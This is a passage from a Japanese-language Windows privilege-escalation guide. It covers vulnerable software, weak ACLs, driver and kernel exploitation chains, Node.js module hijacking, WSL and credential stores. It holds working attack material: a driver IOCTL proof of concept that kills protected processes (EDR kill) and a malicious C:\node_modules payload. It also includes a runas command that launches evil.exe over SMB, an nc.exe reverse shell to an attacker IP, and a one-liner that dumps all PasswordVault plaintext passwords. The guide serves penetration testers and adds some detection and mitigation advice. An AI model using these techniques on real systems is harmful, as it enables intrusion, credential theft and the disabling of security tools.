スケジュールされたタスクについては、アクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2 つのサイドカーパスの ACL を確認してください。タスクで作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手掛かりにすぎず、タスクがそこから入力ファイルを読み込む証拠にはなりません。プロジェクトの作業ファイルが存在するという前提条件も満たされている必要があります。SYSTEM で実行されると決めつけず、実際のタスクのプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして権限昇格できる可能性があります）と、**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、コマンドファイルを `C:\Windows\Temp` に書き込み、置き換えに失敗した場合に、既存の書き込み保護されたファイルを実行していた古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストール済みの正確なパッチレベルと、影響を受ける agent の操作を実行できるかを確認してください。`2.1` のようなブランチ名だけでは、影響の有無を判断できません。ファイルの作成や agent コマンドの実行をせずに、バージョン、サービスの状態、Temp のアクセス許可を調査できます。

#### ADSelfService Plus の SAML サービス確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は ADSelfService Plus の build 6210 以前に影響し、ベンダーは build 6211 で修正しました。SAML SSO が**有効である、または過去に有効だった**場合にのみ関係します。そのため、インストール済み製品のエントリやサービスパスは手がかりにすぎず、脆弱性の判定材料にはなりません。正確な build、SAML 設定の履歴、サービスへのネットワーク到達性、実行アカウントを確認してください。サービス経由のコード実行はそのアカウントの権限を引き継ぎます。SYSTEM 権限での実行には、SYSTEM で実行されるインスタンスが必要です。製品の Backup ディレクトリに読み取り可能な `OfflineBackup_*.ezip` がある場合、それは別個の暗号化バックアップに関する手がかりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の調査では展開せず、パスとアクセス権を記録してください。

#### Jenkins controller とドメインアカウントの境界

Windows Jenkins controller では、job の作成または設定権限と、job の起動権限を区別してください。[Jenkins のドキュメントでは、これらは別々の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明されています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別のビルド経路になる場合もありますが、それが有効で、実際にビルドが実行されることを確認してください。実行時の ID は controller または選択された agent の ID であり、保存された認証情報を使用できるのは、その job が当該スコープにアクセスできる場合に限られます。また、`JENKINS_HOME` のメタデータへのアクセスも確認してください。Jenkins は認証情報のデータと暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけではパスワードは判明しません。**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認し、共有出力に秘密情報を表示しないでください。そのアカウントが AD user-object の `scriptPath` 書き込み権限を持つ場合、対象ユーザーとして実行される実際のログオンまたはスケジュール実行の仕組みと、スクリプトパスへの書き込みが可能であることを確認してから、ユーザー間の実行と判断してください。さらにグループを制御できるかどうかは、実効 AD 権限を別途確認する必要があります。

#### Azure Pipelines self-hosted agent の ID

Azure DevOps Server または Azure Pipelines の project では、pipeline の**作成または編集**権限と、pipeline の**キュー投入**および選択した agent pool の使用権限を区別してください。[Microsoft は pipeline の権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)を別々に説明しています。低権限アカウントがスクリプトステップを送信し、その pipeline を self-hosted Windows agent 上で実行できる場合、そのステップは[agent に設定されたオペレーティングシステムのアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザー間または SYSTEM への権限移行を主張する前に、対象の pipeline、ブランチやリソースの制限、認可された pool、実行可能な job、agent サービスの ID を確認してください。agent のインストール、project のロール、またはリポジトリへの書き込み権限だけでは手がかりにすぎません。パッシブな調査では、ビルドを開始せずに権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL database にアクセスする **ADSync service account** と、ディレクトリ権限が設定済みの同期機能に依存する **AD DS connector account** を区別しています。connector の認証情報はその database に暗号化して保存され、キー素材は[ADSync service account の下で DPAPI によって保護されています](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスのインストール、ローカル管理者を思わせるグループ、または database の可視性だけでは、復号可能な認証情報やドメイン権限昇格があるとは判断できません。実際の database 読み取り権限、サービスアカウントとキーへのアクセス、インストールおよび SQL の構成、設定済みの connector ID、その ID が持つ実効 AD 権限をそれぞれ確認してください。通常の調査では、サービスとアクセスのメタデータのみを表示し、保存された秘密情報を照会したり表示したりしないでください。

#### プリンタードライバーのサポート DLL のアクセス許可

インストール済みのプリンタードライバーは、サポート DLL を `C:\ProgramData` 以下に置き、より高い権限を持つ印刷プロセスで読み込む場合があります。プリンターの WMI 列挙が拒否される場合でも、親ディレクトリや reparse point を含め、該当するドライバーディレクトリと DLL の ACL を確認してください。[Ricoh のプリンタードライバーに関する問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` です。[元の開示情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) では、`PrintIsolationHost.exe` による DLL の読み込みについて説明されています。ACL で書き込み可能であることは手がかりにすぎません。拒否エントリを考慮した実効書き込み権限、該当するドライバーがインストールされており、特権 ID の下でそのファイルを読み込むこと、ベンダーの更新済みドライバーまたはセキュリティプログラムでインストールが修正されているかを確認してください。ディレクトリ名やドライバーバージョンだけから脆弱性を推定しないでください。

### 書き込み権限

設定ファイルを変更して特別なファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認してください。

システム内の権限が弱いフォルダーやファイルを見つける方法は次のとおりです:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ は、`plugins` サブフォルダー内のプラグイン DLL を自動ロードします。書き込み可能なポータブル版やコピー版がインストールされている場合、悪意のあるプラグインを配置すると、起動のたびに `notepad++.exe` 内でコードが自動実行されます（`DllMain` やプラグインのコールバックからも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリやバイナリを上書きできるか確認してください。**\
**権限昇格に利用できる興味深い自動実行の場所**については、**以下のページ**を参照してください。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の怪しい、または脆弱な**ドライバーがないか探します

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write プリミティブ（設計の不十分な IOCTL ハンドラーによく見られる）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順を追った technique はこちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

関連する Windows kernel exploitation の資料：

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅くする（最大長の component や深い directory chain を使う）ことで、時間枠をマイクロ秒から数十マイクロ秒に広げられます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain の中には、単体では弱い2つの bug、つまり queue lock を保持したまま request/CBD を解放する **cancel-safe queue lifetime race** と、`RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** を組み合わせて構築できるものがあります。<sup>[[29]](#references)</sup>

監査と exploitation のメモ：

- **lock 中に解放し、その後 cancel**：成功経路が **Acquire -> CompleteRequest/free -> Release** を行い、cancel 経路が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を行う箇所を探してください。成功経路が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- 解放済みの queue object を、同じサイズの attacker-controlled な paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entries は payload とサイズを制御でき、後から pipe の read/peek 操作で調べられるため有用です。解放済み object に list link が含まれている場合は、これを **user memory 内の fake request node の循環リスト**で上書きすると、ドライバーは元の list head で終了せず、attacker が定義した request structure を繰り返し処理します。
- **予測可能な write を強化する**：fake request によって bookkeeping write（timestamp / QPC / refcount 近傍の field）で使われる nested context pointer が差し替わる場合、**書き込み先アドレスは制御できるが、値は制御できない** kernel write を得られる可能性があります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、破損した object が **out-of-bounds paged-pool read** を引き起こすまで spray を列挙します。
- **race 可能な disclosure のパターン**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を行う syscall は、どれも有力な候補です。攻撃者がコピーする buffer を大きくできる場合（たとえば、多数の list/resource entry を追加して serializer の最終 allocation size を増やすなど）、信頼性が高まります。マシンをクラッシュさせずにコピー時間が延び、置き換え可能な時間枠が広がるためです。
- **pointer が多い refill target**：Windows **I/O ring** の registered-buffer array は、paged-pool のサイズを攻撃者が制御でき（`8 * regBufferCnt`）、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。この array を leak して周囲の `IORING_OBJECT` を特定し、**`RegBuffers`** と **`RegBuffersCount`** を破損させると、後続の I/O ring 操作で attacker-forged entry を使わせ、任意の kernel read/write を実現できます。利用できる write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` の値）しか与えない場合は、**重複する非アライン write**を使って `0x0101010101010101` のような同じ byte が繰り返される user pointer を構築し、`VirtualAlloc` でそのアドレスを map して、偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグに役立つ指標：

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意の kernel read/write を取得したら、標準的な primitive 取得後の手順で SYSTEM token を窃取します:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損 primitive

最新の hive 脆弱性では、決定論的なメモリ配置を作り、書き込み可能な HKLM/HKU の子キーを悪用し、カスタム driver を使わずにメタデータの破損を kernel paged-pool overflow に変換できます。攻撃の全手順はこちら:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスによる `RtlQueryRegistryValues` の direct-mode type confusion

一部の driver は userland からレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証してから、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を `RTL_QUERY_REGISTRY_DIRECT` とともに呼び出し、`int readValue` のようなスタック上のスカラーに値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に応じて解釈されます。

これにより、次の2つの有用な primitive が生まれます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` を使って、driver に攻撃者が指定したキーを照会させ、戻り値やログを通じてキーの存在を漏らし、場合によっては呼び出し元が直接アクセスできない値を読み取れます。
- **Kernel memory corruption**: `&readValue` のようなスカラーの格納先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定されたバイナリバッファとして型が誤認されます。

実践的な exploit の注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_DIRECT` を使った照会が **untrusted hive** にヒットし、`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。exploit 可能な状態を保つには、`HKCU` 配下に値を用意するのではなく、**trusted system hive 内にある攻撃者が書き込み可能なキー**を探してください。
- **Trusted-hive staging**: NtObjectManager を使って `\Registry\Machine` 配下の書き込み可能な子キーを列挙し、複製した **low-integrity** token でもスキャンを再実行して、sandboxed context からアクセス可能なキーを特定します:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 8-byte の直接書き込みを 4-byte の `int` に行うと、隣接するスタックデータが破損し、近くの callback/function pointer が部分的に上書きされる可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode では、`EntryContext` が `UNICODE_STRING` を指すことを前提としています。コードが攻撃者制御の `REG_DWORD` をスタック上のスカラーに読み込み、その後同じバッファを文字列読み込みに再利用すると、攻撃者が `Length` / `MaximumLength` を制御し、`Buffer` ポインターにも部分的に影響を与えるため、半制御の kernel write が可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct mode は `EntryContext` の先頭にある `LONG` を符号付きバッファサイズとして扱います。先行する `REG_DWORD` の読み込みで、再利用されるスカラーに攻撃者制御の**負の値**が残ると、次の `REG_BINARY` クエリで攻撃者のバイト列が隣接するスタックスロットに直接コピーされます。これは多くの場合、callback-pointer を完全に上書きする最も簡単な方法です。

有力なハンティングパターン: **再初期化せずに、同じスタック変数へ異なる型のレジストリ値を読み込むこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される `EntryContext` ポインター、および最初のレジストリ読み込みによって2回目の読み込みが行われるかどうかが決まるコードパスを grep してください。

#### デバイスオブジェクトでの FILE_DEVICE_SECURE_OPEN 設定漏れの悪用（LPE + EDR kill）

一部の署名済みサードパーティ製ドライバーは、IoCreateDeviceSecure で強力な SDDL を指定してデバイスオブジェクトを作成しますが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れています。このフラグがないと、余分なコンポーネントを含むパス経由でデバイスを開く際にセキュア DACL が適用されず、次のような名前空間パスを使うことで、権限のないユーザーでもハンドルを取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例)

ユーザーがデバイスを開けるようになると、ドライバーが公開する特権付き IOCTL を悪用して、LPE や改ざんを実行できます。実環境で確認された機能の例:
- 任意のプロセスへのフルアクセスハンドルの返却（token theft / DuplicateTokenEx/CreateProcessAsUser 経由の SYSTEM shell）。
- 制限のない raw disk read/write（オフライン改ざん、ブート時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスの終了。これにより、user mode から kernel 経由で AV/EDR kill が可能になります。

最小限の PoC パターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACL による制限を意図したデバイスオブジェクトを作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定してください。
- 特権操作では呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加してください。
- IOCTL を制限し（アクセスマスク、METHOD_*、入力検証）、カーネル権限を直接使う代わりに、ブローカー経由のモデルを検討してください。

防御側の検知案
- 不審なデバイス名（例：\\ .\\amsdk*）に対するユーザーモードからのオープンや、悪用を示す特定の IOCTL シーケンスを監視してください。
- Microsoft の脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストを維持してください。


## PATH DLL Hijacking

**PATH 上にあるフォルダー内への書き込み権限**があれば、プロセスが読み込む DLL をハイジャックして、**権限を昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーのアクセス許可を確認してください:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron モジュール解決 hijacking

これは、Node.js および Electron アプリケーションが `require("foo")` のような bare import を実行し、想定されるモジュールが**見つからない**場合に影響する、**Windows の制御されない検索パス**の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上にたどり、各親ディレクトリの `node_modules` フォルダーを確認してパッケージを解決します。Windows では、この探索がドライブのルートに到達することがあるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を順に調べる可能性があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を配置し、依存関係が見つからない状態の**高権限 Node/Electron プロセス**が解決を試みるのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行されている場合、昇格されたスケジュールタスクやサービスラッパーから実行される場合、または特権デスクトップアプリとして自動起動される場合、これは**LPE**につながります。

特に、次のような状況でよく発生します。

- 依存関係が `optionalDependencies` で宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続ける
- 本番ビルドからパッケージが削除された、パッケージング時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` がメインアプリケーションのコードではなく、依存関係ツリーの深い場所にある

### 脆弱なターゲットの調査

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` に `node_modules` が `contains` される条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` で最後に成功したオープンに注目する

展開した `.asar` ファイルやアプリケーションのソースコードで役立つコードレビューのパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースの確認から、**不足しているパッケージ名**を特定します。
2. 存在しない場合は、ルートの検索ディレクトリを作成します。

```powershell
mkdir C:\node_modules
```

3. 期待される正確な名前のモジュールを配置する:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. victim applicationを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Nodeは `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに当てはまる、実際に存在するmissing optional moduleの例には `bluebird` と `utf-8-validate` があります。ただし、再利用可能な部分は**technique**です。特権で実行されるWindowsのNode/Electronプロセスが解決する、任意の**missing bare import**を探します。

### 検出とハードニングのアイデア

- ユーザーによる `C:\node_modules` の作成や、新しい `.js` ファイル／パッケージの書き込みを検知します。
- 高い整合性レベルで動作するプロセスが `C:\node_modules\*` から読み込んでいないか調査します。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査します。
- サードパーティーのコードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認します。
- ライブラリが対応している場合は、オプションのprobeを無効にします（たとえば、一部の `ws` デプロイでは `WS_NO_UTF_8_VALIDATE=1` を設定して、レガシーな `utf-8-validate` のprobeを回避できます）。

## Network

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts ファイル

hostsファイルにハードコードされている他の既知のコンピューターを確認する。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースと DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限対象のサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセス所有者、実行ファイルのパス、および起動元のサービスやスケジュールタスクと照合します。リモートコントロールサービスでデスクトップユーザーとしてアクセスできるかどうかは、その認証およびコマンド制御の設定によります。より高い権限を持つアカウントで動作するカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手がかりにすぎません。認証が必要なメモリ破損経路を確認するには、該当するバイナリそのものと、そこに到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールがあるだけでは、宛先に到達可能であることや脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP テーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewallルール

[**Firewall関連のコマンドはこちらを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root ユーザーを取得すると、任意のポートで listen できます（初めて `nc.exe` を使ってポートを listen すると、ファイアウォールで `nc` を許可するかどうかを GUI で確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash を root として簡単に起動するには、`--default-user root` を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで `WSL` のファイルシステムを確認できます。

WSL 内の Linux の `root` であることだけでは、Windows の Administrator 権限は付与されません。現在の Windows ID でディストリビューションのファイルシステムを読み取れる場合は、コマンドによって認証情報が記録されている可能性があるため、シェル履歴ファイル（`/root/.bash_history` を含む）を確認してください。ただし、権限昇格には、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs` の構成は古い WSL インストールに該当します。WSL 2 では通常、ディストリビューションは [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存場所を特定してください。自動列挙中に履歴の内容を出力するのは避けてください。

## Windows の資格情報

### Winlogon の資格情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。`DefaultPassword` または `AltDefaultPassword` に空でない値があれば、レジストリに平文の認証情報があることを示します。`AutoAdminLogon=1` でも、平文のパスワードを読み取れない場合は手がかりにすぎません。[Sysinternals Autologon はパスワードを LSA secret として保存することがあります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りでは、その secret が存在するか、取得できるかは確認できません。認証情報の露出として報告する前に、アクセス権と実際のログオン構成を確認してください。

### 資格情報マネージャー / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault には、サーバー、Web サイト、その他のプログラムでユーザーを**自動的にログインさせる**ために **Windows** が使用できるユーザー資格情報が保存されます。一見すると、Facebook、Twitter、Gmail などのサイトの資格情報を保存して、ブラウザーに自動ログインさせられるように思えるかもしれませんが、そういう仕組みではありません。

Windows Vault には、Windows がユーザーを自動的にログインさせるために使う資格情報が保存されます。つまり、リソース（サーバーまたは Web サイト）にアクセスするために資格情報を必要とする**Windows アプリケーションは、この Credential Manager と Windows Vault を利用**し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された資格情報を使用できます。

アプリケーションが Credential Manager と連携していない限り、特定のリソース用の資格情報を利用することはできないと思います。したがって、アプリケーションで vault を利用するには、何らかの方法で**credential manager と通信し、そのリソースの資格情報をデフォルトのストレージ vault に要求する**必要があります。

`cmdkey` を使って、マシンに保存されている資格情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された認証情報を使用するために、`runas` を `/savecred` オプションとともに使用できます。次の例では、SMB share 経由でリモートの binary を呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報を使用した `runas` の利用。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)からも取得できます。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを Universal Windows Platform（UWP）の `PasswordVault` 内に保存します（`vaultcmd` では `Web Credentials` としても表示されます）。このストレージ領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` がなくても、ネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます。

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API（DPAPI）**は、データを対称暗号化する方法を提供します。主にWindowsオペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムのシークレットを利用して、エントロピーを大幅に高めます。

